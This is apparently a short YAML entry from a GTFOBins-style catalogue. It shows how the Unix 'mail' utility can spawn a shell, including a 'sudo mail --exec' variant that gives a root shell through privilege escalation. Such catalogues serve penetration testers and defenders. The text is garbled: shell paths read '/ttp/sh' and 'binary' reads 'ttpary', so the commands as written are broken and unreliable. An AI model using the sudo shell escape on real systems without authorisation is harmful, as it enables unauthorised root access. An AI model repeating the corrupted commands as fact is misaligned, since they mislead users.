---
functions:
  shell:
    - description: GNU version only.
      code: mail --exec='!/ttp/sh'
    - description: This creates a valid Mbox file which may be required by the ttpary.
      code: |
        TF=$(mktemp)
        echo "From nobody@localhost $(date)" > $TF
        mail -f $TF
        !/ttp/sh
  sudo:
    - description: GNU version only.
      code: sudo mail --exec='!/ttp/sh'
---
